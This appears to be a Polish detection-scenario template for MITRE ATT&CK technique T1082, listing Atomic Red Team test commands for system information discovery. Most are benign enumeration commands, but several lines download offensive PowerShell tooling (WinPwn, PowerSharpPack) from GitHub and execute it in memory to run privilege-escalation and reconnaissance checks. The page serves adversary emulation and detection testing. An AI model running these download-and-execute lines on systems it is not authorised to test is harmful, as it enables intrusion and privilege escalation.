# Alert: System Information Discovery

Opis scenariusza, podatności lub techniki.

---

**Technika:** T1082  
**Nazwa:** System Information Discovery  
**Taktyki:** Discovery  
**Status:** Pending  
**Autor:** Krzysztof K.  

---

<!--
Tactics: Discovery
Technique ID: T1082
Technique Name: System Information Discovery
Status: Pending
--> 


---

## Atomic Red Team – dostępne testy dla tej techniki

### System Information Discovery
**Opis:** 

<b>Polecenia testowe (cmd):</b>
```
systeminfo
reg query HKLM\SYSTEM\CurrentControlSet\Services\Disk\Enum
```
[Pobierz test_1.cmd](../../scenarios/atomic_tests\T1082\System_Information_Discovery/test_1.cmd)

### Hostname Discovery (Windows)
**Opis:** 

<b>Polecenia testowe (cmd):</b>
```
hostname
```
[Pobierz test_1.cmd](../../scenarios/atomic_tests\T1082\Hostname_Discovery_(Windows)/test_1.cmd)

### Windows MachineGUID Discovery
**Opis:** 

<b>Polecenia testowe (cmd):</b>
```
REG QUERY HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography /v MachineGuid
```
[Pobierz test_1.cmd](../../scenarios/atomic_tests\T1082\Windows_MachineGUID_Discovery/test_1.cmd)

### Griffon Recon
**Opis:** 

<b>Polecenia testowe (powershell):</b>
```
cscript "#{vbscript}"
```
[Pobierz test_1.ps1](../../scenarios/atomic_tests\T1082\Griffon_Recon/test_1.ps1)

### Environment variables discovery on windows
**Opis:** 

<b>Polecenia testowe (cmd):</b>
```
set
```
[Pobierz test_1.cmd](../../scenarios/atomic_tests\T1082\Environment_variables_discovery_on_windo/test_1.cmd)

### WinPwn - winPEAS
**Opis:** 

<b>Polecenia testowe (powershell):</b>
```
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
winPEAS -noninteractive -consoleoutput
```
[Pobierz test_1.ps1](../../scenarios/atomic_tests\T1082\WinPwn_-_winPEAS/test_1.ps1)

### WinPwn - itm4nprivesc
**Opis:** 

<b>Polecenia testowe (powershell):</b>
```
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
itm4nprivesc -noninteractive -consoleoutput
```
[Pobierz test_1.ps1](../../scenarios/atomic_tests\T1082\WinPwn_-_itm4nprivesc/test_1.ps1)

### WinPwn - Powersploits privesc checks
**Opis:** 

<b>Polecenia testowe (powershell):</b>
```
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
oldchecks -noninteractive -consoleoutput
```
[Pobierz test_1.ps1](../../scenarios/atomic_tests\T1082\WinPwn_-_Powersploits_privesc_checks/test_1.ps1)

<b>Polecenia cleanup (powershell):</b>
```
rm -force -recurse .\DomainRecon -ErrorAction Ignore
rm -force -recurse .\Exploitation -ErrorAction Ignore
rm -force -recurse .\LocalPrivEsc -ErrorAction Ignore
rm -force -recurse .\LocalRecon -ErrorAction Ignore
rm -force -recurse .\Vulnerabilities -ErrorAction Ignore
```
[Pobierz cleanup_1.ps1](../../scenarios/atomic_tests\T1082\WinPwn_-_Powersploits_privesc_checks/cleanup_1.ps1)

### WinPwn - General privesc checks
**Opis:** 

<b>Polecenia testowe (powershell):</b>
```
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
otherchecks -noninteractive -consoleoutput
```
[Pobierz test_1.ps1](../../scenarios/atomic_tests\T1082\WinPwn_-_General_privesc_checks/test_1.ps1)

### WinPwn - GeneralRecon
**Opis:** 

<b>Polecenia testowe (powershell):</b>
```
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
Generalrecon -consoleoutput -noninteractive
```
[Pobierz test_1.ps1](../../scenarios/atomic_tests\T1082\WinPwn_-_GeneralRecon/test_1.ps1)

### WinPwn - Morerecon
**Opis:** 

<b>Polecenia testowe (powershell):</b>
```
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
Morerecon -noninteractive -consoleoutput
```
[Pobierz test_1.ps1](../../scenarios/atomic_tests\T1082\WinPwn_-_Morerecon/test_1.ps1)

### WinPwn - RBCD-Check
**Opis:** 

<b>Polecenia testowe (powershell):</b>
```
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
RBCD-Check -consoleoutput -noninteractive
```
[Pobierz test_1.ps1](../../scenarios/atomic_tests\T1082\WinPwn_-_RBCD-Check/test_1.ps1)

### WinPwn - PowerSharpPack - Watson searching for missing windows patches
**Opis:** 

<b>Polecenia testowe (powershell):</b>
```
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpWatson.ps1')
Invoke-watson
```
[Pobierz test_1.ps1](../../scenarios/atomic_tests\T1082\WinPwn_-_PowerSharpPack_-_Watson_searchi/test_1.ps1)

### WinPwn - PowerSharpPack - Sharpup checking common Privesc vectors
**Opis:** 

<b>Polecenia testowe (powershell):</b>
```
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpUp.ps1')
Invoke-SharpUp -command "audit"
```
[Pobierz test_1.ps1](../../scenarios/atomic_tests\T1082\WinPwn_-_PowerSharpPack_-_Sharpup_checki/test_1.ps1)

### WinPwn - PowerSharpPack - Seatbelt
**Opis:** 

<b>Polecenia testowe (powershell):</b>
```
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Seatbelt.ps1')
Invoke-Seatbelt -Command "-group=all"
```
[Pobierz test_1.ps1](../../scenarios/atomic_tests\T1082\WinPwn_-_PowerSharpPack_-_Seatbelt/test_1.ps1)

### System Information Discovery with WMIC
**Opis:** 

<b>Polecenia testowe (cmd):</b>
```
wmic cpu get name
wmic MEMPHYSICAL get MaxCapacity
wmic baseboard get product
wmic baseboard get version
wmic bios get SMBIOSBIOSVersion
wmic path win32_VideoController get name
wmic path win32_VideoController get DriverVersion
wmic path win32_VideoController get VideoModeDescription
wmic OS get Caption,OSArchitecture,Version
wmic DISKDRIVE get Caption
Get-WmiObject win32_bios
```
[Pobierz test_1.cmd](../../scenarios/atomic_tests\T1082\System_Information_Discovery_with_WMIC/test_1.cmd)

### System Information Discovery
**Opis:** 

<b>Polecenia testowe (cmd):</b>
```
wscript.exe C:\Windows\System32\gatherNetworkInfo.vbs
```
[Pobierz test_1.cmd](../../scenarios/atomic_tests\T1082\System_Information_Discovery/test_1.cmd)

### Check computer location
**Opis:** 

<b>Polecenia testowe (cmd):</b>
```
reg query "HKEY_CURRENT_USER\Control Panel\International\Geo"
```
[Pobierz test_1.cmd](../../scenarios/atomic_tests\T1082\Check_computer_location/test_1.cmd)

### BIOS Information Discovery through Registry
**Opis:** 

<b>Polecenia testowe (cmd):</b>
```
reg query HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\System /v SystemBiosVersion
reg query HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\System /v VideoBiosVersion
```
[Pobierz test_1.cmd](../../scenarios/atomic_tests\T1082\BIOS_Information_Discovery_through_Regis/test_1.cmd)

### ESXi - VM Discovery using ESXCLI
**Opis:** 

<b>Polecenia testowe (cmd):</b>
```
echo "" | "#{plink_file}" "#{vm_host}" -ssh  -l "#{vm_user}" -pw "#{vm_pass}" -m "#{cli_script}"
```
[Pobierz test_1.cmd](../../scenarios/atomic_tests\T1082\ESXi_-_VM_Discovery_using_ESXCLI/test_1.cmd)

### ESXi - Darkside system information discovery
**Opis:** 

<b>Polecenia testowe (cmd):</b>
```
echo "" | "#{plink_file}" "#{vm_host}" -ssh  -l "#{vm_user}" -pw "#{vm_pass}" -m "#{cli_script}"
```
[Pobierz test_1.cmd](../../scenarios/atomic_tests\T1082\ESXi_-_Darkside_system_information_disco/test_1.cmd)

### operating system discovery
**Opis:** 

<b>Polecenia testowe (powershell):</b>
```
Get-CimInstance Win32_OperatingSystem | Select-Object Caption, Version, ServicePackMajorVersion, OSArchitecture, CSName, WindowsDirectory | Out-null
```
[Pobierz test_1.ps1](../../scenarios/atomic_tests\T1082\operating_system_discovery/test_1.ps1)

### Check OS version via "ver" command
**Opis:** 

<b>Polecenia testowe (cmd):</b>
```
ver
```
[Pobierz test_1.cmd](../../scenarios/atomic_tests\T1082\Check_OS_version_via__ver__command/test_1.cmd)

### Display volume shadow copies with "vssadmin"
**Opis:** 

<b>Polecenia testowe (cmd):</b>
```
vssadmin.exe list shadows
```
[Pobierz test_1.cmd](../../scenarios/atomic_tests\T1082\Display_volume_shadow_copies_with__vssad/test_1.cmd)

### Identify System Locale and Regional Settings with PowerShell
**Opis:** 

<b>Polecenia testowe (cmd):</b>
```
powershell.exe -c "Get-Culture | Format-List | Out-File -FilePath %TMP%\a.txt"
```
[Pobierz test_1.cmd](../../scenarios/atomic_tests\T1082\Identify_System_Locale_and_Regional_Sett/test_1.cmd)

<b>Polecenia cleanup (cmd):</b>
```
cmd.exe /c del "%TMP%\a.txt"
```
[Pobierz cleanup_1.cmd](../../scenarios/atomic_tests\T1082\Identify_System_Locale_and_Regional_Sett/cleanup_1.cmd)

### Enumerate Available Drives via gdr
**Opis:** 

<b>Polecenia testowe (cmd):</b>
```
powershell.exe -c "gdr -PSProvider 'FileSystem'"
```
[Pobierz test_1.cmd](../../scenarios/atomic_tests\T1082\Enumerate_Available_Drives_via_gdr/test_1.cmd)

### Discover OS Product Name via Registry
**Opis:** 

<b>Polecenia testowe (cmd):</b>
```
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v ProductName
```
[Pobierz test_1.cmd](../../scenarios/atomic_tests\T1082\Discover_OS_Product_Name_via_Registry/test_1.cmd)

### Discover OS Build Number via Registry
**Opis:** 

<b>Polecenia testowe (cmd):</b>
```
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v CurrentBuildNumber
```
[Pobierz test_1.cmd](../../scenarios/atomic_tests\T1082\Discover_OS_Build_Number_via_Registry/test_1.cmd)

[Zobacz testy na GitHubie](https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1082)
